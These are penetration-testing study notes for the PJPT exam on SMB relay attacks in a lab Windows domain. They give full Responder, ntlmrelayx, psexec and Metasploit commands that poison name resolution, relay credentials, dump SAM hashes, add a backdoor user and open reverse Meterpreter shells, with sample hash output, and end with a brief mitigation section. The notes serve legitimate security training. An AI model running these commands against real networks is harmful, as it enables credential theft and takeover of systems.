# SMB Relay Attacks (PJPT Prep)

## What is SMB Relay?
**SMB Relay** is an advanced technique that builds on LLMNR/NBT-NS poisoning. Instead of cracking captured hashes, we relay those hashes to specific target machines to potentially gain access.

**Key concept:** Use captured authentication attempts to authenticate to other systems without needing to crack passwords.

## Requirements

### Critical Prerequisites
- **SMB signing must be disabled or not enforced** on the target machine
- **Relayed user credentials must have admin privileges** on the target machine for meaningful access
- Target must be reachable over SMB (port 445)

### Identifying Vulnerable Hosts
Use Nmap to scan for hosts without SMB signing:

```bash
nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
```

Look for output showing:
```
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

This indicates SMB signing is **not enforced** (vulnerable to relay).

## Attack Steps

### 1. Identify Targets Without SMB Signing
Scan the network to find vulnerable machines:

```bash
# Scan entire subnet
nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24

# Scan specific target
nmap --script=smb2-security-mode.nse -p445 192.168.1.10
```

### 2. Set Up Responder for Relay
Configure Responder to capture but not respond to SMB/HTTP:

Edit `/etc/responder/Responder.conf`:
```
[Responder Core]
; Servers to start
SQL = On
SMB = Off
HTTP = Off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTPS = On
DNS = On
LDAP = On
```

Start Responder:
```bash
sudo responder -I tun0 -dwP
```

Expected output:
```
NBT-NS, LLMNR & MDNS Responder 2.3.3.9

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
```

### 3. Run ntlmrelayx
Use Impacket's ntlmrelayx to relay captured hashes:

```bash
# Basic relay to single target
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Relay with command execution
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Relay and dump SAM database
sudo ntlmrelayx.py -tf targets.txt -smb2support --sam

# Interactive shell mode
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```

Where `targets.txt` contains IP addresses of vulnerable machines:
```
10.0.0.35
192.168.1.10
192.168.1.15
```

### 4. Successful Attack Examples

#### Example 1: SAM Dump Success
```
[*] SMBD-Thread-3: Received connection from 10.0.0.25, attacking target smb://10.0.0.35
[*] Authenticating against smb://10.0.0.35 as MARVEL\fcastle SUCCEED
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x60a74a27f6fe13fde77ab1994e3a9424
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:db310d981df37b942c5d3c19e43849c4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
```

#### Example 2: Interactive Shell Access
```
[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Received connection from 10.0.0.25, attacking target smb://10.0.0.35
[*] Authenticating against smb://10.0.0.35 as MARVEL\fcastle SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

Connect to interactive shell:
```bash
nc 127.0.0.1 11000
# shares
ADMIN$
C$
IPC$
# use C$
# ls
# help
Type help for list of commands
```

#### Example 3: Command Execution
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

Success output:
```
[*] Authenticating against smb://10.0.0.35 as MARVEL\fcastle SUCCEED
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Executed specified command on host: 10.0.0.35
nt authority\system
```

### 5. Post-Exploitation with Gained Credentials

#### Using Impacket PsExec for Direct Shell Access
Once you have valid credentials (from SAM dump or other means):

```bash
# Using psexec with captured credentials
psexec.py marvel.local/fcastle:'Password1'@10.0.0.25

# Example output:
# Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
# [*] Requesting shares on 10.0.0.25.....
# [*] Found writable share ADMIN$
# [*] Uploading file NJFQWyMx.exe
# [*] Opening SVCManager on 10.0.0.25.....
# [*] Creating service hsjw on 10.0.0.25.....
# [*] Starting service hsjw.....
# [!] Press help for extra shell commands
# Microsoft Windows [Version 10.0.19042.631]
# (c) 2020 Microsoft Corporation. All rights reserved.
# 
# C:\Windows\system32>
```

#### Using Metasploit PsExec Module
For a more advanced post-exploitation with Meterpreter:

```bash
# Start Metasploit
msfconsole

# Use the psexec module
use exploit/windows/smb/psexec

# Configure the module
set RHOSTS 192.168.1.10
set SMBUser fcastle
set SMBPass Password1
set SMBDomain marvel.local
set LHOST 192.168.138.134
set LPORT 4444

# Show options to verify configuration
show options

# Execute the exploit
exploit
```

**Module Configuration:**
```
Name         Current Setting      Required  Description
----         ---------------      --------  -----------
EXITFUNC     thread              yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST        192.168.138.134     yes       The listen address (an interface may be specified)
LPORT        4444                yes       The listen port
RHOSTS       192.168.1.10        yes       The target host(s)
SMBDomain    marvel.local        no        The Windows domain to use for authentication
SMBPass      Password1           no        The password for the specified username
SMBUser      fcastle             no        The username to authenticate as
```

**Expected Results:**
```
[*] Started reverse TCP handler on 192.168.138.134:4444
[*] 192.168.1.10:445 - Connecting to the server...
[*] 192.168.1.10:445 - Authenticating to 192.168.1.10:445 as user 'fcastle'...
[*] 192.168.1.10:445 - Selecting PowerShell target
[*] 192.168.1.10:445 - Executing the payload...
[*] Sending stage (175174 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (192.168.138.134:4444 -> 192.168.1.10:xxxxx)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-TARGET
OS              : Windows 10 (10.0 Build 19042).
Architecture    : x64
System Language : en_US
Domain          : MARVEL
Logged On Users : 2
Meterpreter     : x64/windows
```

## Common ntlmrelayx Options

```bash
# Interactive shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# Dump local SAM
sudo ntlmrelayx.py -tf targets.txt -smb2support --sam

# Dump domain hashes (if domain admin)
sudo ntlmrelayx.py -tf targets.txt -smb2support --ntds

# Execute specific command
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "net user hacker Password123 /add"

# Use specific interface
sudo ntlmrelayx.py -tf targets.txt -smb2support -if tun0
```

## Example Attack Flow

1. **Discovery:**
   ```bash
   nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
   ```

2. **Create targets file:**
   ```bash
   echo "10.0.0.35" > targets.txt
   ```

3. **Configure Responder:**
   ```bash
   sudo mousepad /etc/responder/Responder.conf
   # Set SMB = Off and HTTP = Off
   ```

4. **Start attack (2 terminals):**
   ```bash
   # Terminal 1 - Responder
   sudo responder -I tun0 -dwP
   
   # Terminal 2 - ntlmrelayx
   sudo ntlmrelayx.py -tf targets.txt -smb2support --sam
   ```

5. **Wait for authentication or trigger it**

6. **Connect to interactive shell (if using -i flag):**
   ```bash
   nc 127.0.0.1 11000
   ```

7. **Use captured credentials for further exploitation:**
   ```bash
   # With Impacket
   psexec.py domain/user:password@target
   
   # With Metasploit
   msfconsole
   use exploit/windows/smb/psexec
   set RHOSTS target_ip
   set SMBUser captured_user
   set SMBPass captured_password
   exploit
   ```

## Error Messages to Watch For

```bash
# SMB Signing enabled (attack won't work)
[-] SMB SessionError: STATUS_SHARING_VIOLATION(A file cannot be opened because the share access flags are incompatible.)

# Success indicator
[*] Authenticating against smb://10.0.0.35 as MARVEL\fcastle SUCCEED
```

## Mitigation

### Primary Defenses
- **Enable SMB signing** on all systems (required, not optional)
- **Disable LLMNR and NBT-NS** (prevents initial hash capture)
- **Network segmentation** to limit relay scope

### SMB Signing Configuration
**Via Group Policy:**
- `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`
- Set **"Microsoft network client: Digitally sign communications (always)"** to **Enabled**
- Set **"Microsoft network server: Digitally sign communications (always)"** to **Enabled**

### Additional Measures
- **Least privilege principle** - limit admin accounts
- **Account separation** - don't use admin accounts for daily tasks
- **Monitor SMB traffic** for unusual relay patterns
- **Use LAPS** (Local Administrator Password Solution) for unique local admin passwords

## Key Points for PJPT
- SMB Relay is more dangerous than hash cracking (direct access vs. offline cracking)
- **SMB signing is the primary defense** - always check this first
- Requires admin privileges on target for meaningful access
- Often combined with LLMNR poisoning for initial hash capture
- Can lead to domain compromise if domain admin credentials are relayed
- **Success = "SUCCEED" message** in ntlmrelayx output
- **Interactive shells** provide direct file system access
- **SAM dumps** give you local account hashes for further attacks
- **Metasploit psexec** provides advanced post-exploitation with Meterpreter
- **Multiple tools available:** Impacket psexec vs Metasploit psexec module

## Tools Summary
- **nmap** - Identify hosts without SMB signing
- **Responder** - Capture authentication attempts (with SMB/HTTP disabled)
- **ntlmrelayx** (Impacket) - Relay captured hashes
- **psexec.py** (Impacket) - Use captured credentials for shell access
- **exploit/windows/smb/psexec** (Metasploit) - Advanced exploitation with Meterpreter
- **netcat (nc)** - Connect to interactive shells from ntlmrelayx
- **targets.txt** - List of vulnerable target IPs 